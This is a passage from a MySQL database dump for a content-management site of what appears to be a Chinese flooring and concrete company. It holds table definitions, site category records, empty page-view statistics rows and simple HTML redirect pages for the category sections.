CREATE TABLE `libang_enewscard` (
  `cardid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `card_no` char(30) NOT NULL DEFAULT '',
  `password` char(20) NOT NULL DEFAULT '',
  `money` int(10) unsigned NOT NULL DEFAULT '0',
  `cardfen` int(10) unsigned NOT NULL DEFAULT '0',
  `endtime` date NOT NULL DEFAULT '0000-00-00',
  `cardtime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `carddate` int(10) unsigned NOT NULL DEFAULT '0',
  `cdgroupid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `cdzgroupid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`cardid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewscard`
--

LOCK TABLES `libang_enewscard` WRITE;
/*!40000 ALTER TABLE `libang_enewscard` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewscard` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsclass`
--

DROP TABLE IF EXISTS `libang_enewsclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `bclassid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `classname` varchar(50) NOT NULL DEFAULT '',
  `sonclass` text NOT NULL,
  `is_zt` tinyint(1) NOT NULL DEFAULT '0',
  `lencord` smallint(6) NOT NULL DEFAULT '0',
  `link_num` tinyint(4) NOT NULL DEFAULT '0',
  `newstempid` smallint(6) NOT NULL DEFAULT '0',
  `onclick` int(11) NOT NULL DEFAULT '0',
  `listtempid` smallint(6) NOT NULL DEFAULT '0',
  `featherclass` text NOT NULL,
  `islast` tinyint(1) NOT NULL DEFAULT '0',
  `classpath` text NOT NULL,
  `classtype` varchar(10) NOT NULL DEFAULT '',
  `newspath` varchar(20) NOT NULL DEFAULT '',
  `filename` tinyint(1) NOT NULL DEFAULT '0',
  `filetype` varchar(10) NOT NULL DEFAULT '',
  `openpl` tinyint(1) NOT NULL DEFAULT '0',
  `openadd` tinyint(1) NOT NULL DEFAULT '0',
  `newline` int(11) NOT NULL DEFAULT '0',
  `hotline` int(11) NOT NULL DEFAULT '0',
  `goodline` int(11) NOT NULL DEFAULT '0',
  `classurl` varchar(200) NOT NULL DEFAULT '',
  `groupid` smallint(6) NOT NULL DEFAULT '0',
  `myorder` smallint(6) NOT NULL DEFAULT '0',
  `filename_qz` varchar(20) NOT NULL DEFAULT '',
  `hotplline` tinyint(4) NOT NULL DEFAULT '0',
  `modid` smallint(6) NOT NULL DEFAULT '0',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `firstline` tinyint(4) NOT NULL DEFAULT '0',
  `bname` varchar(50) NOT NULL DEFAULT '',
  `islist` tinyint(1) NOT NULL DEFAULT '0',
  `searchtempid` smallint(6) NOT NULL DEFAULT '0',
  `tid` smallint(6) NOT NULL DEFAULT '0',
  `tbname` varchar(60) NOT NULL DEFAULT '',
  `maxnum` int(11) NOT NULL DEFAULT '0',
  `checkpl` tinyint(1) NOT NULL DEFAULT '0',
  `down_num` tinyint(4) NOT NULL DEFAULT '0',
  `online_num` tinyint(4) NOT NULL DEFAULT '0',
  `listorder` varchar(50) NOT NULL DEFAULT '',
  `reorder` varchar(50) NOT NULL DEFAULT '',
  `intro` text NOT NULL,
  `classimg` varchar(255) NOT NULL DEFAULT '',
  `jstempid` smallint(6) NOT NULL DEFAULT '0',
  `addinfofen` int(11) NOT NULL DEFAULT '0',
  `listdt` tinyint(1) NOT NULL DEFAULT '0',
  `showclass` tinyint(1) NOT NULL DEFAULT '0',
  `showdt` tinyint(1) NOT NULL DEFAULT '0',
  `checkqadd` tinyint(1) NOT NULL DEFAULT '0',
  `qaddlist` tinyint(1) NOT NULL DEFAULT '0',
  `qaddgroupid` text NOT NULL,
  `qaddshowkey` tinyint(1) NOT NULL DEFAULT '0',
  `adminqinfo` tinyint(1) NOT NULL DEFAULT '0',
  `doctime` smallint(6) NOT NULL DEFAULT '0',
  `classpagekey` varchar(255) NOT NULL DEFAULT '',
  `dtlisttempid` smallint(6) NOT NULL DEFAULT '0',
  `classtempid` smallint(6) NOT NULL DEFAULT '0',
  `nreclass` tinyint(1) NOT NULL DEFAULT '0',
  `nreinfo` tinyint(1) NOT NULL DEFAULT '0',
  `nrejs` tinyint(1) NOT NULL DEFAULT '0',
  `nottobq` tinyint(1) NOT NULL DEFAULT '0',
  `ipath` varchar(255) NOT NULL DEFAULT '',
  `addreinfo` tinyint(1) NOT NULL DEFAULT '0',
  `haddlist` tinyint(4) NOT NULL DEFAULT '0',
  `sametitle` tinyint(1) NOT NULL DEFAULT '0',
  `definfovoteid` smallint(6) NOT NULL DEFAULT '0',
  `wburl` varchar(255) NOT NULL DEFAULT '',
  `qeditchecked` tinyint(1) NOT NULL DEFAULT '0',
  `wapstyleid` smallint(6) NOT NULL DEFAULT '0',
  `repreinfo` tinyint(1) NOT NULL DEFAULT '0',
  `pltempid` smallint(6) NOT NULL DEFAULT '0',
  `cgroupid` text NOT NULL,
  `yhid` smallint(6) NOT NULL DEFAULT '0',
  `wfid` smallint(6) NOT NULL DEFAULT '0',
  `cgtoinfo` tinyint(1) NOT NULL DEFAULT '0',
  `bdinfoid` varchar(25) NOT NULL DEFAULT '',
  `repagenum` smallint(5) unsigned NOT NULL DEFAULT '0',
  `keycid` smallint(6) NOT NULL DEFAULT '0',
  `allinfos` int(10) unsigned NOT NULL DEFAULT '0',
  `infos` int(10) unsigned NOT NULL DEFAULT '0',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0',
  `oneinfo` tinyint(1) NOT NULL DEFAULT '0',
  `addsql` varchar(255) NOT NULL DEFAULT '',
  `wapislist` tinyint(1) NOT NULL DEFAULT '0',
  `fclast` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`classid`),
  KEY `bclassid` (`bclassid`)
) ENGINE=MyISAM AUTO_INCREMENT=28 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsclass`
--

LOCK TABLES `libang_enewsclass` WRITE;
/*!40000 ALTER TABLE `libang_enewsclass` DISABLE KEYS */;
INSERT INTO `libang_enewsclass` VALUES (1,0,'产品中心','|7|8|9|10|11|22|23|24|26|',0,25,10,0,0,2,'',0,'cpzx','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'产品中心',2,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',2,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,0,0,1586931453,0,'',0,1587023011),(2,0,'关于我们','|12|13|14|',0,25,10,0,0,1,'',0,'gywm','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'关于我们',2,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',1,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,0,0,1586931585,0,'',0,1587022302),(3,0,'新闻资讯','|15|16|17|',0,25,10,0,0,1,'',0,'xwzx','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'新闻资讯',2,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',1,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,0,0,1586931602,0,'',0,1587023123),(4,0,'工程案例','|18|19|',0,9,10,0,0,3,'',0,'gcal','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'工程案例',2,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',3,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,0,0,1586931617,0,'',0,1587023240),(5,0,'公司实力','|20|21|',0,25,10,0,0,0,'',0,'gssl','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'公司实力',2,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',0,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,0,0,1586931630,0,'',0,1587023701),(6,0,'联系我们','',0,25,10,10,0,1,'',1,'lxwm','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'联系我们',0,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',1,1,1,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,1,1,1586931656,0,'',0,1589272516),(7,1,'功能性地坪','',0,9,10,2,0,2,'|1|',1,'cpzx/gnxdp','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'功能性地坪',0,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',2,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,11,11,1586931785,0,'',0,1587017747),(8,1,'环氧地坪','',0,9,10,2,0,2,'|1|',1,'cpzx/hydp','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'环氧地坪',0,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',2,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,15,15,1586931812,0,'',0,1586931812),(9,1,'高端商业地坪','',0,9,10,2,0,2,'|1|',1,'cpzx/gdsydp','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'高端商业地坪',0,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',2,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,8,8,1586931836,0,'',0,1586931836),(10,1,'户外及运动场所','',0,9,10,2,0,2,'|1|',1,'cpzx/hwydcs','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'户外及运动场所',0,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',2,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,7,7,1586931859,0,'',0,1586931859),(11,1,'地坪材料','',0,9,10,2,0,2,'|1|',1,'cpzx/dpcl','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'地坪材料',0,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',2,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,8,8,1586931876,0,'',0,1586931876),(12,2,'公司简介','',0,25,10,3,0,1,'|2|',1,'gywm/gsjj','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'公司简介',0,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',1,1,1,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,1,1,1586931915,0,'',0,1587022667),(13,2,'企业文化','',0,25,10,11,0,1,'|2|',1,'gywm/qywh','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'企业文化',0,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',1,1,1,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,1,1,1586931944,0,'',0,1589783344),(14,2,'公司风采','',0,25,10,12,0,1,'|2|',1,'gywm/gsfc','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'公司风采',0,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',1,1,1,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,1,1,1586931972,0,'',0,1589783357),(15,3,'企业资讯','',0,8,10,1,0,1,'|3|',1,'xwzx/qyzx','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'企业资讯',0,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',1,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,10,10,1586932012,0,'',0,1587012530),(16,3,'行业动态','',0,25,10,1,0,1,'|3|',1,'xwzx/hydt','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'行业动态',0,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',1,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,0,0,1586932035,0,'',0,1586932035),(17,3,'常见问题','',0,25,10,1,0,1,'|3|',1,'xwzx/cjwt','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'常见问题',0,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',1,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,0,0,1586932062,0,'',0,1586932062),(18,4,'最新案例','',0,9,10,2,0,3,'|4|',1,'gcal/zxal','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'最新案例',1,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',3,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,36,36,1586932182,0,'',0,1587019142),(19,4,'经典案例','',0,9,10,2,0,3,'|4|',1,'gcal/jdal','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'经典案例',0,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',3,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,0,0,1586932211,0,'',0,1587019151),(20,5,'荣誉资质','',0,6,10,3,0,4,'|5|',1,'gssl/ryzz','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'荣誉资质',0,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',4,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,13,13,1586932284,0,'',0,1587024415),(21,5,'合作伙伴','',0,9,10,3,0,4,'|5|',1,'gssl/hzhb','.html','',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'合作伙伴',0,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',4,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,8,8,1586932309,0,'',0,1587024549),(22,1,'混凝土激光摊铺整平','',0,9,10,2,0,2,'|1|',1,'cpzx/hntjg','.html','Y-m-d',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'混凝土激光摊铺整平',1,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',2,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,4,4,1587624615,0,'',0,1587696407),(23,1,'交通安全设施','',0,9,10,2,0,2,'|1|',1,'cpzx/jtanss','.html','Y-m-d',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'交通安全设施',1,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',2,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,15,15,1587624970,0,'',0,1587696396),(24,1,'固化剂地坪','',0,9,10,2,0,2,'|1|',1,'cpzx/ghjdp','.html','Y-m-d',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'固化剂地坪',0,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',2,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,4,4,1587626077,0,'',0,1587696434),(26,1,'透水混凝土','',0,9,10,2,0,2,'|1|',1,'cpzx/tshnt','.html','Y-m-d',0,'.html',0,1,10,10,10,'',0,0,'',10,1,1,10,'透水混凝土',0,0,1,'news',0,0,2,2,'id DESC','newstime DESC','','',1,0,0,0,0,0,0,'',0,0,0,'',2,1,0,0,0,0,'',1,0,0,0,'',0,0,0,0,'',0,0,0,'',0,0,4,4,1588932369,0,'',0,1588932369);
/*!40000 ALTER TABLE `libang_enewsclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsclass_stats`
--

DROP TABLE IF EXISTS `libang_enewsclass_stats`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsclass_stats` (
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `uptime` int(10) unsigned NOT NULL DEFAULT '0',
  `pvall` int(10) unsigned NOT NULL DEFAULT '0',
  `pvyear` int(10) unsigned NOT NULL DEFAULT '0',
  `pvhalfyear` int(10) unsigned NOT NULL DEFAULT '0',
  `pvquarter` int(10) unsigned NOT NULL DEFAULT '0',
  `pvmonth` int(10) unsigned NOT NULL DEFAULT '0',
  `pvweek` int(10) unsigned NOT NULL DEFAULT '0',
  `pvday` int(10) unsigned NOT NULL DEFAULT '0',
  `pvyesterday` int(10) unsigned NOT NULL DEFAULT '0',
  `ipall` int(10) unsigned NOT NULL DEFAULT '0',
  `ipyear` int(10) unsigned NOT NULL DEFAULT '0',
  `iphalfyear` int(10) unsigned NOT NULL DEFAULT '0',
  `ipquarter` int(10) unsigned NOT NULL DEFAULT '0',
  `ipmonth` int(10) unsigned NOT NULL DEFAULT '0',
  `ipweek` int(10) unsigned NOT NULL DEFAULT '0',
  `ipday` int(10) unsigned NOT NULL DEFAULT '0',
  `ipyesterday` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsclass_stats`
--

LOCK TABLES `libang_enewsclass_stats` WRITE;
/*!40000 ALTER TABLE `libang_enewsclass_stats` DISABLE KEYS */;
INSERT INTO `libang_enewsclass_stats` VALUES (1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(13,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(21,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(23,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0),(26,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);
/*!40000 ALTER TABLE `libang_enewsclass_stats` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsclass_stats_ip`
--

DROP TABLE IF EXISTS `libang_enewsclass_stats_ip`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsclass_stats_ip` (
  `ip` char(21) NOT NULL DEFAULT '',
  PRIMARY KEY (`ip`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsclass_stats_ip`
--

LOCK TABLES `libang_enewsclass_stats_ip` WRITE;
/*!40000 ALTER TABLE `libang_enewsclass_stats_ip` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsclass_stats_ip` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsclass_stats_set`
--

DROP TABLE IF EXISTS `libang_enewsclass_stats_set`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsclass_stats_set` (
  `openstats` tinyint(1) NOT NULL DEFAULT '0',
  `pvtime` int(10) unsigned NOT NULL DEFAULT '0',
  `statsdate` int(10) unsigned NOT NULL DEFAULT '0',
  `changedate` int(10) unsigned NOT NULL DEFAULT '0'
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsclass_stats_set`
--

LOCK TABLES `libang_enewsclass_stats_set` WRITE;
/*!40000 ALTER TABLE `libang_enewsclass_stats_set` DISABLE KEYS */;
INSERT INTO `libang_enewsclass_stats_set` VALUES (0,3600,0,20170227);
/*!40000 ALTER TABLE `libang_enewsclass_stats_set` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsclassadd`
--

DROP TABLE IF EXISTS `libang_enewsclassadd`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsclassadd` (
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `classtext` mediumtext NOT NULL,
  `ttids` text NOT NULL,
  `eclasspagetext` mediumtext NOT NULL,
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsclassadd`
--

LOCK TABLES `libang_enewsclassadd` WRITE;
/*!40000 ALTER TABLE `libang_enewsclassadd` DISABLE KEYS */;
INSERT INTO `libang_enewsclassadd` VALUES (1,'<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n<meta http-equiv=\\\"refresh\\\" content=\\\"0;url=/cpzx/gnxdp/\\\">\r\n</head>\r\n</html>','',''),(2,'<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n<meta http-equiv=\\\"refresh\\\" content=\\\"0;url=/gywm/gsjj/\\\">\r\n</head>\r\n</html>','',''),(3,'<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n<meta http-equiv=\\\"refresh\\\" content=\\\"0;url=/xwzx/qyzx/\\\">\r\n</head>\r\n</html>','',''),(4,'<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n<meta http-equiv=\\\"refresh\\\" content=\\\"0;url=/gcal/zxal/\\\">\r\n</head>\r\n</html>','',''),(5,'<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n<meta http-equiv=\\\"refresh\\\" content=\\\"0;url=/gssl/ryzz/\\\">\r\n</head>\r\n</html>','',''),(6,'','',''),(7,'','',''),(8,'','',''),(9,'','',''),(10,'','',''),(11,'','',''),(12,'','',''),(13,'','',''),(14,'','',''),(15,'','',''),(16,'','',''),(17,'','',''),(18,'','',''),(19,'','',''),(20,'','',''),(21,'','',''),(22,'','',''),(23,'','',''),(24,'','',''),(26,'','','');
/*!40000 ALTER TABLE `libang_enewsclassadd` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsclassf`
--

DROP TABLE IF EXISTS `libang_enewsclassf`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsclassf` (
  `fid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `f` varchar(30) NOT NULL DEFAULT '',
  `fname` varchar(30) NOT NULL DEFAULT '',
  `fform` varchar(20) NOT NULL DEFAULT '',
  `fhtml` mediumtext NOT NULL,
  `fzs` varchar(255) NOT NULL DEFAULT '',
  `myorder` smallint(5) unsigned NOT NULL DEFAULT '0',
  `ftype` varchar(30) NOT NULL DEFAULT '',
  `flen` varchar(20) NOT NULL DEFAULT '',
  `fvalue` text NOT NULL,
  `fformsize` varchar(12) NOT NULL DEFAULT '',
  PRIMARY KEY (`fid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsclassf`
--

LOCK TABLES `libang_enewsclassf` WRITE;
/*!40000 ALTER TABLE `libang_enewsclassf` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsclassf` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsclassnavcache`
--

DROP TABLE IF EXISTS `libang_enewsclassnavcache`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsclassnavcache` (
  `navtype` char(16) NOT NULL DEFAULT '',
  `userid` int(10) unsigned NOT NULL DEFAULT '0',
  `modid` smallint(5) unsigned NOT NULL DEFAULT '0',
  KEY `navtype` (`navtype`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsclassnavcache`
--

LOCK TABLES `libang_enewsclassnavcache` WRITE;
/*!40000 ALTER TABLE `libang_enewsclassnavcache` DISABLE KEYS */;
INSERT INTO `libang_enewsclassnavcache` VALUES ('modclass',0,1),('jsclass',0,0),('listenews',0,0),('listclass',0,0);
/*!40000 ALTER TABLE `libang_enewsclassnavcache` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsclasstemp`
--

DROP TABLE IF EXISTS `libang_enewsclasstemp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsclasstemp` (
  `tempid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `tempname` varchar(30) NOT NULL DEFAULT '',
  `temptext` mediumtext NOT NULL,
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`tempid`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsclasstemp`
--

LOCK TABLES `libang_enewsclasstemp` WRITE;
/*!40000 ALTER TABLE `libang_enewsclasstemp` DISABLE KEYS */;
